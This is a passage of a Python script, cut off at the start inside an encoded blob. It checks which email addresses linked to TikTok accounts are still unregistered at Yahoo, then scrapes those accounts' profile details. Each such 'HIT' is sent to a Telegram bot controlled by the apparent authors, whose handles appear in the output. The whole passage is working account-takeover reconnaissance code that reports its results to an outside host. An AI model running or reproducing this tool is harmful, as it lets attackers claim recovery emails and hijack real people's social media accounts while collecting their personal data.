YbUO8DjLQaqBUQz4605kvpG9DCbN4CmoSWDtcZiv364MiptanNo9xuCeY6B0ayBM/V4Lmpo7wiT0b9lvpTN/buoijnUOam4JRPSRUVl8wmyK/YXUB9shlUqPL7niUyQwltuNwkxFw5dGwRQeVEPViL3793wRnhKSpQbD91XFNhXCWwlfOxuVI5p445HZeLccY++8E9Egm6jL+KYjUojZ1aqztKHBAN7PDhDDytHDIabS/ESNNW2LWiEMX4T9jWtrn4bFVbuFKDpYQFB1VTS4m0HsmQlKb+L5xN9PnnjiLVA5vEqAcrigy9b1oH/LJRYvtYrHSp6y0Y1tf12yvuB/xG5CicsdbhFCuRMpY8FoswLH2duLo7Adh1aa3exEyN3DpTkpXeS6z7DYT5LzZR0FEnwURZW3bZFfCQE6jrOPZX3rSn6qw/2uEkXkvgVyg3O+aZJ7y+l23xIa1Iqnn48Zo9xX9C+zn0sQUegpBewVBQ6Ynb5oRyKic7yEiVczuF8esjVqWsE65QcDBsXG6uBM8mAbPLbAOCTAepX0VJtJOQxMXt1JFDPCQZTJUCrF5+9GVNnIA1n2WavhYcDcs5RbDamo/Qnm/CGLA/BybWf1rhsGymfBCeQG8XBzcktxBhOp+iLzTOUNVRGZCzE8B2++eeNDXTrCZR7FMBVlN5KtRg4nb9KeYnGCSnTcdPm|WNmTyEAdNFwsIZ4Dg9+QpA==|/h04/pw6mN/cQMRQuqMPtw==',
                            'multiDomain': '',
                            'tos0': 'oath_freereg|xa|en-JO',
                            'firstName': 'f',
                            'lastName': 'f',
                            'userid-domain': 'yahoo',
                            'userId': nm,
                            'password': 'zaidkaream',
                            'birthYear': '2000',
                            'signup': ''
                        }
                        try:
                            
                            res = requests.post(url,data=d,headers=h).text
                        except requests.exceptions.ConnectionError as error:
                            continue
                        if ('"IDENTIFIER_NOT_AVAILABLE"') in res:
                            Y+=1
                            os.system('cls'if os.name=='nt'else'claer')
                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                        if ('"IDENTIFIER_EXISTS"') in res:
                            Y+=1
                            os.system('cls'if os.name=='nt'else'claer')
                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                        if ('"LENGTH_TOO_SHORT"') in res:
                            Y+=1
                            os.system('cls'if os.name=='nt'else'claer')
                            print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                        if ('{"errors":[]}') in res:
                            us11 = lg.split('@')[0]
                            
                            ui = f'https://qado-tik-info.reback.repl.co/?user={us11}&sess=8'
                            ik = requests.get(ui).text
                            if ('اليوزر غير موجود') in ik:
                                p+=1
                            else:
                                y+=1
                        
                                nam = ik.split('name :')[1]
                                name = nam.split('follower')[0]
                                fo = nam.split('follower :')[1]
                                fol = fo.split('following :')[0]
                                fols = ik.split('following :')[1]
                                fols1 = fols.split(' heart :')[0]
                                lik = ik.split('heart :')[1]
                                like = lik.split('bio :')[0]
                                bi = ik.split('bio :')[1]
                                bio = bi.split('id :')[0]
                                id1 = ik.split('id :')[1]
                                id = id1.split('posts : ')[0]
                                vieod= ik.split('posts :')[1]
                        
                            #re2 = requests.get(url2,headers=head2).json()
                                j+=1
                                req = f'HIT : {j}\nName : {name}\nEmail : {lg}\nFolloing : {fol}\nFollower : {fols1}\nVideo : {vieod}\nID : {id}\nBio : {bio}\n\nBy : @MVMVP - @FFNZZ'
                                tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={req}')
                                ru= requests.post(tlg)
                               
                                a+=1
                                os.system('cls'if os.name=='nt'else'claer')
                                print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                    elif ('"Bind device by email failed"') in ree:
                        yy+=1
                        os.system('cls'if os.name=='nt'else'claer')
                        print(f'= Gmail : <{a}> <{p}> <{m}>\n= Yahoo : <{y}> <{Y}> <{yy}>\n= Telegram  @MVMVP')
                        
                    
                
        except IndexError as error:
            zaidk()
        
              

    #return False

zaidk()
